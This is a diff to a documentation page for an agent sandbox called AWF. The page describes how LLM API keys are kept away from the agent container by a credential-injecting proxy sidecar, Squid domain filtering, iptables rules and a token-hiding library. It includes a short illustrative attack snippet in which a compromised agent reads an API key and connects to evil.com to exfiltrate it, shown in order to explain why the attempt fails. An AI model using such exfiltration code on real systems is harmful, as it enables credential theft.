@@ -1,19 +1,21 @@
-# Authentication Architecture: How AWF Handles LLM API Tokens
+---
+title: Authentication Architecture
+description: How AWF isolates LLM API tokens using a multi-container credential separation architecture.
+---
 
-## Overview
+AWF implements a multi-layered security architecture to protect LLM API authentication tokens while providing transparent proxying for AI agent calls. This document explains the complete authentication flow, token isolation mechanisms, and network routing for both OpenAI/Codex and Anthropic/Claude APIs.
 
-The Agentic Workflow Firewall (AWF) implements a multi-layered security architecture to protect LLM API authentication tokens while providing transparent proxying for AI agent calls. This document explains the complete authentication flow, token isolation mechanisms, and network routing for both **OpenAI/Codex** and **Anthropic/Claude** APIs.
+:::note
+Both OpenAI/Codex and Anthropic/Claude use identical credential isolation architecture. API keys are held exclusively in the api-proxy sidecar container (never in the agent container), and both providers route through the same Squid proxy for domain filtering. The only differences are the port numbers (10000 for OpenAI, 10001 for Anthropic) and authentication header formats (`Authorization: Bearer` vs `x-api-key`).
+:::
 
-> [!IMPORTANT]
-> **Both OpenAI/Codex and Anthropic/Claude use identical credential isolation architecture.** API keys are held exclusively in the api-proxy sidecar container (never in the agent container), and both providers route through the same Squid proxy for domain filtering. The only differences are the port numbers (10000 for OpenAI, 10001 for Anthropic) and authentication header formats (`Authorization: Bearer` vs `x-api-key`).
-
-## Architecture Components
+## Architecture components
 
 AWF uses a **3-container architecture** when API proxy mode is enabled:
 
-1. **Squid Proxy Container** (`172.30.0.10`) - L7 HTTP/HTTPS domain filtering
-2. **API Proxy Sidecar Container** (`172.30.0.30`) - Credential injection and isolation
-3. **Agent Execution Container** (`172.30.0.20`) - User command execution environment
+1. **Squid Proxy Container** (`172.30.0.10`) — L7 HTTP/HTTPS domain filtering
+2. **API Proxy Sidecar Container** (`172.30.0.30`) — credential injection and isolation
+3. **Agent Execution Container** (`172.30.0.20`) — user command execution environment
 
 ```
 ┌─────────────────────────────────────────────────────────────────┐
@@ -39,7 +41,7 @@ AWF uses a **3-container architecture** when API proxy mode is enabled:
 │ ✓ HTTP_PROXY=172.30.0.10:3128   │       │ ✓ ANTHROPIC_BASE_URL=            │
 │ ✓ HTTPS_PROXY=172.30.0.10:3128  │       │     http://172.30.0.30:10001    │
 │                                  │       │ ✓ OPENAI_BASE_URL=               │
-│ Ports:                           │       │     http://172.30.0.30:10000    │
+│ Ports:                           │       │     http://172.30.0.30:10000/v1 │
 │ - 10000 (OpenAI proxy)          │◄──────│ ✓ GITHUB_TOKEN=ghp_...           │
 │ - 10001 (Anthropic proxy)       │       │   (protected by one-shot-token)  │
 │                                  │       │                                  │
@@ -64,11 +66,11 @@ AWF uses a **3-container architecture** when API proxy mode is enabled:
          Internet (api.anthropic.com)
 ```
 
-## Token Flow: Step-by-Step
+## Token flow: step by step
 
-### 1. Token Sources and Initial Handling
+### 1. Token sources and initial handling
 
-**Location:** `src/cli.ts:988-989`
+**Source:** `src/cli.ts`
 
 When AWF is invoked with `--enable-api-proxy`:
 
@@ -76,19 +78,19 @@ When AWF is invoked with `--enable-api-proxy`:
 export ANTHROPIC_API_KEY="sk-ant-..."
 export OPENAI_API_KEY="sk-..."
 
-awf --enable-api-proxy --allow-domains api.anthropic.com \
+sudo awf --enable-api-proxy --allow-domains api.anthropic.com \
   "claude-code --prompt 'write hello world'"
 ```
 
-The CLI reads these API keys from the **host environment** at startup.
+The CLI reads API keys from the **host environment** at startup and passes them to the Docker Compose configuration.
 
-### 2. Docker Compose Configuration
+### 2. Docker Compose configuration
 
-**Location:** `src/docker-manager.ts:922-978`
+**Source:** `src/docker-manager.ts`
 
 AWF generates a Docker Compose configuration with three services:
 
-#### API Proxy Service Configuration
+#### API proxy service configuration
 
 ```yaml
 api-proxy:
@@ -104,14 +106,14 @@ api-proxy:
       ipv4_address: 172.30.0.30
 ```
 
-#### Agent Service Configuration
+#### Agent service configuration
 
 ```yaml
 agent:
   environment:
     # NO API KEYS - only base URLs pointing to api-proxy
     - ANTHROPIC_BASE_URL=http://172.30.0.30:10001
-    - OPENAI_BASE_URL=http://172.30.0.30:10000
+    - OPENAI_BASE_URL=http://172.30.0.30:10000/v1
     # GitHub token for MCP servers (protected separately)
     - GITHUB_TOKEN=ghp_...
   networks:
@@ -119,95 +121,66 @@ agent:
       ipv4_address: 172.30.0.20
 ```
 
-**Key Security Decision:** API keys are **intentionally excluded** from the agent container environment (see lines 323-331, 404, and 413-417 in `docker-manager.ts`).
+:::danger[Security design]
+API keys are intentionally excluded from the agent container environment. When `--enable-api-proxy` is set, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, and related keys are added to the excluded environment variables list in `docker-manager.ts`.
+:::
 
-### 3. API Proxy: Credential Injection Layer
+### 3. API proxy: credential injection layer
 
-**Location:** `containers/api-proxy/server.js`
+**Source:** `containers/api-proxy/server.js`
 
 The api-proxy container runs two HTTP servers:
 
-#### Port 10000: OpenAI Proxy
+#### Port 10000: OpenAI proxy
 
 ```javascript
-// Read API key from environment (line 46)
-const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
+// Stripped headers — never forwarded from client
+const STRIPPED_HEADERS = new Set([
+  'host', 'authorization', 'proxy-authorization',
+  'x-api-key', 'forwarded', 'via',
+]);
 
-// Create proxy agent to route through Squid (lines 34-38)
-const proxyAgent = new HttpsProxyAgent({
-  host: process.env.SQUID_PROXY_HOST,
-  port: parseInt(process.env.SQUID_PROXY_PORT, 10),
-});
-
-// Handle incoming request from agent (lines 175-184)
-http.createServer((clientReq, clientRes) => {
-  // Strip any client-supplied auth headers (security)
-  delete clientReq.headers['authorization'];
-
-  // Inject actual API key
-  const headers = {
-    ...clientReq.headers,
+// OpenAI proxy handler
+http.createServer((req, res) => {
+  proxyRequest(req, res, 'api.openai.com', {
     'Authorization': `Bearer ${OPENAI_API_KEY}`,
-    'Host': 'api.openai.com'
-  };
-
-  // Forward to real API through Squid
-  https.request({
-    hostname: 'api.openai.com',
-    method: clientReq.method,
-    path: clientReq.url,
-    headers: headers,
-    agent: proxyAgent  // Routes through Squid
   });
 });
 ```
 
-#### Port 10001: Anthropic Proxy
+#### Port 10001: Anthropic proxy
 
 ```javascript
-// Read API key from environment (line 47)
-const ANTHROPIC_API_KEY = process.env.ANTHROPIC_API_KEY;
-
-// Handle incoming request from agent (lines 218-224)
-http.createServer((clientReq, clientRes) => {
-  // Strip any client-supplied auth headers (security)
-  delete clientReq.headers['x-api-key'];
-
-  // Inject actual API key
-  const headers = {
-    ...clientReq.headers,
-    'x-api-key': ANTHROPIC_API_KEY,
-    'Host': 'api.anthropic.com'
-  };
-
-  // Forward to real API through Squid
-  https.request({
-    hostname: 'api.anthropic.com',
-    method: clientReq.method,
-    path: clientReq.url,
-    headers: headers,
-    agent: proxyAgent  // Routes through Squid
-  });
+// Anthropic proxy handler
+http.createServer((req, res) => {
+  const anthropicHeaders = { 'x-api-key': ANTHROPIC_API_KEY };
+  // Only set anthropic-version as default; preserve agent-provided version
+  if (!req.headers['anthropic-version']) {
+    anthropicHeaders['anthropic-version'] = '2023-06-01';
+  }
+  proxyRequest(req, res, 'api.anthropic.com', anthropicHeaders);
 });
 ```
 
-**Security Feature:** The proxy strips any authentication headers sent by the agent (lines 23-36) and only uses the key from its own environment. This prevents a compromised agent from injecting malicious credentials.
+The `proxyRequest` function copies incoming headers, strips sensitive/proxy headers, injects the authentication headers, and forwards the request to the target API through Squid using `HttpsProxyAgent`.
 
-### 4. Agent Container: SDK Transparent Redirection
+:::caution
+The proxy strips any authentication headers sent by the agent and only uses the key from its own environment. This prevents a compromised agent from injecting malicious credentials.
+:::
 
-**Location:** Agent container environment configuration
+### 4. Agent container: SDK transparent redirection
 
 The agent container sees these environment variables:
 
 ```bash
 ANTHROPIC_BASE_URL=http://172.30.0.30:10001
-OPENAI_BASE_URL=http://172.30.0.30:10000
+OPENAI_BASE_URL=http://172.30.0.30:10000/v1
 ```
 
-These are **standard environment variables** recognized by:
-- Anthropic Python SDK (`anthropic` package)
+These are standard environment variables recognized by the official SDKs:
+- Anthropic Python SDK (`anthropic`)
 - Anthropic TypeScript SDK (`@anthropic-ai/sdk`)
-- OpenAI Python SDK (`openai` package)
+- OpenAI Python SDK (`openai`)
 - OpenAI Node.js SDK (`openai`)
 - Claude Code CLI
 - Codex CLI
@@ -217,7 +190,6 @@ When the agent code makes an API call:
 **Example 1: Anthropic/Claude**
 
 ```python
-# Example: Claude Code or custom agent using Anthropic SDK
 import anthropic
 
 client = anthropic.Anthropic()
@@ -233,12 +205,11 @@ response = client.messages.create(
 **Example 2: OpenAI/Codex**
 
 ```python
-# Example: Codex or custom agent using OpenAI SDK
 import openai
 
 client = openai.OpenAI()
 # SDK reads OPENAI_BASE_URL from environment
-# Sends request to http://172.30.0.30:10000 instead of api.openai.com
+# Sends request to http://172.30.0.30:10000/v1 instead of api.openai.com
 
 response = client.chat.completions.create(
     model="gpt-4",
@@ -246,33 +217,30 @@ response = client.chat.completions.create(
 )
 ```
 
-The SDKs **automatically use the base URL** without requiring any code changes. The agent thinks it's talking to the real API, but requests are routed through the secure api-proxy sidecar.
+The SDKs automatically use the base URL without requiring any code changes.
 
-### 5. Network Routing: iptables Rules
+### 5. Network routing: iptables rules
 
-**Location:** `containers/agent/setup-iptables.sh:131-134, 275`
+**Source:** `containers/agent/setup-iptables.sh`
 
-Special iptables rules ensure proper routing:
+Special iptables rules ensure proper routing for the api-proxy:
 
 ```bash
-# Allow direct access to api-proxy (bypass normal proxy redirection)
+# Allow direct access to api-proxy (bypass NAT redirection)
 if [ -n "$AWF_API_PROXY_IP" ]; then
-  echo "[iptables] Allow traffic to API proxy sidecar (${AWF_API_PROXY_IP})..."
   iptables -t nat -A OUTPUT -d "$AWF_API_PROXY_IP" -j RETURN
 fi
-
-# ... later ...
 
 # Accept TCP traffic to api-proxy
 iptables -A OUTPUT -p tcp -d "$AWF_API_PROXY_IP" -j ACCEPT
 ```
 
-Without these rules, traffic to `172.30.0.30` would be redirected to Squid via NAT rules, creating a routing loop.
+Without the NAT `RETURN` rule, traffic to `172.30.0.30` would be redirected to Squid via the DNAT rules, creating a routing loop.
 
-**Traffic Flow for Anthropic/Claude:**
+**Traffic flow for Anthropic/Claude:**
 
 1. Agent SDK makes HTTP request to `172.30.0.30:10001`
-2. iptables allows direct TCP connection (no redirection)
+2. iptables allows direct TCP connection (NAT `RETURN` rule)
 3. API proxy receives request on port 10001
 4. API proxy injects `x-api-key: sk-ant-...` header
 5. API proxy forwards to `api.anthropic.com` via Squid (using `HttpsProxyAgent`)
@@ -280,10 +248,10 @@ Without these rules, traffic to `172.30.0.30` would be redirected to Squid via N
 7. Squid forwards to real API endpoint
 8. Response flows back: API → Squid → api-proxy → agent
 
-**Traffic Flow for OpenAI/Codex:**
+**Traffic flow for OpenAI/Codex:**
 
-1. Agent SDK makes HTTP request to `172.30.0.30:10000`
-2. iptables allows direct TCP connection (no redirection)
+1. Agent SDK makes HTTP request to `172.30.0.30:10000/v1`
+2. iptables allows direct TCP connection (NAT `RETURN` rule)
 3. API proxy receives request on port 10000
 4. API proxy injects `Authorization: Bearer sk-...` header
 5. API proxy forwards to `api.openai.com` via Squid (using `HttpsProxyAgent`)
@@ -291,28 +259,9 @@ Without these rules, traffic to `172.30.0.30` would be redirected to Squid via N
 7. Squid forwards to real API endpoint
 8. Response flows back: API → Squid → api-proxy → agent
 
-### 6. Squid Proxy: Domain Filtering
+### 6. Squid proxy: domain filtering
 
-**Location:** `src/squid-config.ts:462-465`
-
-When api-proxy is enabled, Squid configuration includes:
-
-```squid
-# Allow api-proxy ports
-acl Safe_ports port 10000
-acl Safe_ports port 10001
-
-# Allow api-proxy IP address (dst ACL for IP addresses)
-acl allowed_ips dst 172.30.0.30
-http_access allow allowed_ips
-
-# Allow API domains (dstdomain ACL for hostnames)
-acl allowed_domains dstdomain api.anthropic.com
-acl allowed_domains dstdomain api.openai.com
-http_access allow CONNECT allowed_domains
-```
-
-The api-proxy container's environment forces all outbound traffic through Squid:
+The api-proxy container routes all outbound traffic through Squid via its `HTTP_PROXY`/`HTTPS_PROXY` environment variables:
 
 ```yaml
 environment:
@@ -320,15 +269,19 @@ environment:
   HTTPS_PROXY: http://172.30.0.10:3128
 ```
 
-Even if a compromised api-proxy container tried to connect to a malicious domain, Squid would block it.
+Squid's domain whitelist ACLs control which API domains the sidecar can reach. For example, if only `api.anthropic.com` is whitelisted, the sidecar can only connect to that domain — even if a compromised sidecar tried to connect to a malicious domain, Squid would block it.
 
-## Additional Token Protection Mechanisms
+:::note
+The api-proxy connects to the real APIs (e.g., `api.openai.com`) over standard HTTPS (port 443) through Squid. Ports 10000 and 10001 are only used for internal agent-to-proxy communication within the Docker network.
+:::
 
-### One-Shot Token Library
+## Additional token protection mechanisms
 
-**Location:** `containers/agent/one-shot-token/`
+### One-shot token library
 
-While API keys don't exist in the agent container, other tokens (like `GITHUB_TOKEN`) do. AWF uses an LD_PRELOAD library to protect these:
+**Source:** `containers/agent/one-shot-token/`
+
+While API keys don't exist in the agent container, other tokens (like `GITHUB_TOKEN`) do. AWF uses an `LD_PRELOAD` library to protect these:
 
 ```c
 // Intercept getenv() calls
@@ -350,70 +303,72 @@ char* getenv(const char* name) {
 ```
 
 **Protected tokens by default:**
-- `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` (though not passed to agent)
+- `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` (though not passed to agent when api-proxy is enabled)
 - `OPENAI_API_KEY`, `OPENAI_KEY`
 - `GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN`
 - `GITHUB_API_TOKEN`, `GITHUB_PAT`, `GH_ACCESS_TOKEN`
 - `CODEX_API_KEY`
 
-### Entrypoint Token Cleanup
+### Entrypoint token cleanup
 
-**Location:** `containers/agent/entrypoint.sh:145-176`
+**Source:** `containers/agent/entrypoint.sh`
 
-The entrypoint (PID 1) unsets sensitive tokens from its own environment after a 5-second grace period:
+The entrypoint (PID 1) runs the agent command in the background, then unsets sensitive tokens from its own environment after a 5-second grace period:
 
 ```bash
 unset_sensitive_tokens() {
   local SENSITIVE_TOKENS=(
-    "ANTHROPIC_API_KEY" "CLAUDE_API_KEY" "CLAUDE_CODE_OAUTH_TOKEN"
-    "OPENAI_API_KEY" "OPENAI_KEY"
-    "GITHUB_TOKEN" "GH_TOKEN" "COPILOT_GITHUB_TOKEN"
+    "COPILOT_GITHUB_TOKEN" "GITHUB_TOKEN" "GH_TOKEN"
     "GITHUB_API_TOKEN" "GITHUB_PAT" "GH_ACCESS_TOKEN"
     "GITHUB_PERSONAL_ACCESS_TOKEN"
+    "OPENAI_API_KEY" "OPENAI_KEY"
+    "ANTHROPIC_API_KEY" "CLAUDE_API_KEY" "CLAUDE_CODE_OAUTH_TOKEN"
     "CODEX_API_KEY"
   )
 
   for token in "${SENSITIVE_TOKENS[@]}"; do
     if [ -n "${!token}" ]; then
       unset "$token"
-      echo "[entrypoint] Unset $token from /proc/1/environ" >&2
     fi
   done
 }
 
-# Wait 5 seconds for child processes to start and read tokens
+# Run agent in background, wait for it to cache tokens, then unset
+capsh --drop=cap_net_admin -- -c "exec gosu awfuser $COMMAND" &
+AGENT_PID=$!
 sleep 5
-unset_sensitive_tokens &
+unset_sensitive_tokens
+wait $AGENT_PID
 ```
 
 This prevents tokens from being visible in `/proc/1/environ` after the agent starts.
 
-## Security Properties
+## Security properties
 
-### Credential Isolation
+### Credential isolation
 
-**Primary Security Guarantee:** API keys **never exist** in the agent container environment.
+**Primary security guarantee:** API keys **never exist** in the agent container environment.
 
 - Agent code cannot read API keys via `getenv()` or `os.getenv()`
 - API keys are not visible in `/proc/self/environ` or `/proc/*/environ`
 - Compromised agent code cannot exfiltrate API keys (they don't exist)
 - Only the api-proxy container has access to API keys
 
-### Network Isolation
+### Network isolation
 
-**Defense in Depth:**
+**Defense in depth:**
 
 1. **Layer 1:** Agent cannot make direct internet connections (iptables blocks non-whitelisted traffic)
 2. **Layer 2:** Agent can only reach api-proxy IP (`172.30.0.30`) for API calls
-3. **Layer 3:** API proxy routes ALL traffic through Squid (enforced via `HTTP_PROXY` env)
-4. **Layer 4:** Squid enforces domain whitelist (only `api.anthropic.com`, `api.openai.com`)
+3. **Layer 3:** API proxy routes all traffic through Squid (enforced via `HTTP_PROXY` env)
+4. **Layer 4:** Squid enforces the domain whitelist (only `api.anthropic.com`, `api.openai.com`)
 5. **Layer 5:** Host-level iptables provide additional egress control
 
-**Attack Scenario: What if the agent tries to bypass the proxy?**
+**Attack scenario: what if the agent tries to bypass the proxy?**
 
 ```python
 # Compromised agent tries to exfiltrate API key
-import requests
+import os, requests
 
 # Attempt 1: Try to read API key
 api_key = os.getenv("ANTHROPIC_API_KEY")
@@ -432,9 +387,9 @@ sock.connect(("evil.com", 443))
 
 All attempts fail due to the multi-layered defense.
 
-### Capability Restrictions
+### Capability restrictions
 
-**API Proxy Container:**
+**API proxy container:**
 
 ```yaml
 security_opt:
@@ -447,24 +402,22 @@ pids_limit: 100
 
 Even if exploited, the api-proxy has no elevated privileges and limited resources.
 
-**Agent Container:**
+**Agent container:**
 
-- Starts with `CAP_NET_ADMIN` for iptables setup
-- Drops `CAP_NET_ADMIN` via `capsh --drop=cap_net_admin` before executing user command
+- Starts with `CAP_NET_ADMIN` (and `CAP_SYS_ADMIN`, `CAP_SYS_CHROOT` in chroot mode) for iptables and filesystem setup
+- Drops these capabilities via `capsh --drop=...` before executing the user command
 - Prevents malicious code from modifying firewall rules
 
-## Configuration Requirements
+## Configuration requirements
 
-### Enabling API Proxy Mode
+### Enabling API proxy mode
 
 **Example 1: Using with Claude Code**
 
 ```bash
-# Export Anthropic API key on host
 export ANTHROPIC_API_KEY="sk-ant-api03-..."
 
-# Run AWF with --enable-api-proxy flag
-awf --enable-api-proxy \
+sudo awf --enable-api-proxy \
     --allow-domains api.anthropic.com \
     "claude-code --prompt 'Hello world'"
 ```
@@ -472,11 +425,9 @@ awf --enable-api-proxy \
 **Example 2: Using with Codex**
 
 ```bash
-# Export OpenAI API key on host
 export OPENAI_API_KEY="sk-..."
 
-# Run AWF with --enable-api-proxy flag
-awf --enable-api-proxy \
+sudo awf --enable-api-proxy \
     --allow-domains api.openai.com \
     "codex --prompt 'Hello world'"
 ```
@@ -484,17 +435,15 @@ awf --enable-api-proxy \
 **Example 3: Using both providers**
 
 ```bash
-# Export both API keys on host
 export ANTHROPIC_API_KEY="sk-ant-api03-..."
 export OPENAI_API_KEY="sk-..."
 
-# Run AWF with --enable-api-proxy flag, allowing both domains
-awf --enable-api-proxy \
+sudo awf --enable-api-proxy \
     --allow-domains api.anthropic.com,api.openai.com \
     "your-multi-llm-agent"
 ```
 
-### Domain Whitelist
+### Domain whitelist
 
 When using api-proxy, you must allow the API domains:
 
@@ -502,26 +451,26 @@ When using api-proxy, you must allow the API domains:
 --allow-domains api.anthropic.com,api.openai.com
 ```
 
-Without these, Squid will block the api-proxy's outbound connections.
+Without these, Squid blocks the api-proxy's outbound connections.
 
-### NO_PROXY Configuration
+### NO_PROXY configuration
 
-**Location:** `src/docker-manager.ts:969`
+**Source:** `src/docker-manager.ts`
 
-The agent container's `NO_PROXY` variable includes:
+The agent container's `NO_PROXY` variable includes the api-proxy IP so that agent-to-proxy communication bypasses Squid:
 
 ```bash
-NO_PROXY=127.0.0.1,localhost,172.30.0.30,172.30.0.0/16,api-proxy
+NO_PROXY=localhost,127.0.0.1,172.30.0.30
 ```
 
 This ensures:
 - Local MCP servers (stdio-based) can communicate via localhost
-- Agent can reach api-proxy directly without going through a proxy
+- The agent can reach api-proxy directly without going through Squid
 - Container-to-container communication works properly
 
-## Comparison: With vs Without API Proxy
+## Comparison: with vs without API proxy
 
-### Without API Proxy (Direct Authentication)
+### Without API proxy (direct authentication)
 
 ```
 ┌─────────────────┐
@@ -542,9 +491,9 @@ This ensures:
   api.anthropic.com
 ```
 
-**Security Risk:** If the agent is compromised, the attacker can read the API key from environment variables.
+**Security risk:** If the agent is compromised, the attacker can read the API key from environment variables.
 
-### With API Proxy (Credential Isolation)
+### With API proxy (credential isolation)
 
 ```
 ┌─────────────────┐     ┌────────────────┐
@@ -563,19 +512,19 @@ This ensures:
                           api.anthropic.com
 ```
 
-**Security Improvement:** Compromised agent cannot access API keys (they don't exist in agent environment).
+**Security improvement:** A compromised agent cannot access API keys — they don't exist in the agent environment.
 
-## Key Files Reference
+## Key files reference
 
 | File | Purpose |
 |------|---------|
-| `src/cli.ts:988-989` | CLI reads API keys from host environment |
-| `src/docker-manager.ts:922-978` | Docker Compose generation, token routing logic |
-| `containers/api-proxy/server.js` | API proxy implementation (credential injection) |
-| `containers/agent/setup-iptables.sh:131-134, 275` | iptables rules for api-proxy routing |
-| `containers/agent/entrypoint.sh:145-176` | Entrypoint token cleanup |
+| `src/cli.ts` | CLI reads API keys from host environment |
+| `src/docker-manager.ts` | Docker Compose generation, token routing, env var exclusion |
+| `containers/api-proxy/server.js` | API proxy implementation (credential injection, header stripping) |
+| `containers/agent/setup-iptables.sh` | iptables rules for api-proxy routing |
+| `containers/agent/entrypoint.sh` | Entrypoint token cleanup, capability drop |
+| `containers/agent/api-proxy-health-check.sh` | Pre-flight credential isolation verification |
 | `containers/agent/one-shot-token/` | LD_PRELOAD library for token protection |
-| `src/squid-config.ts:462-465` | Squid Safe_ports configuration for api-proxy |
 | `docs/api-proxy-sidecar.md` | User-facing API proxy documentation |
 | `docs/token-unsetting-fix.md` | Token cleanup implementation details |
 
@@ -586,8 +535,16 @@ AWF implements **credential isolation** through architectural separation:
 1. **API keys live in api-proxy container only** (never in agent environment)
 2. **Agent uses standard SDK environment variables** (`*_BASE_URL`) to redirect traffic
 3. **API proxy injects credentials** and routes through Squid
-4. **Squid enforces domain whitelist** (only allowed API domains)
+4. **Squid enforces the domain whitelist** (only allowed API domains)
 5. **iptables enforces network isolation** (agent cannot bypass proxy)
 6. **Multiple token cleanup mechanisms** protect other credentials (GitHub tokens, etc.)
 
 This architecture provides **transparent operation** (SDKs work without code changes) while maintaining **strong security** (compromised agent cannot steal API keys).
+
+## Related documentation
+
+- [API Proxy Sidecar](./api-proxy-sidecar.md) — user-facing guide for enabling the API proxy
+- [Security](./security.md) — overall security model
+- [Architecture](./architecture.md) — overall system architecture
+- [Token Unsetting Fix](./token-unsetting-fix.md) — token cleanup implementation details
+- [Environment Variables](./environment.md) — environment variable configuration
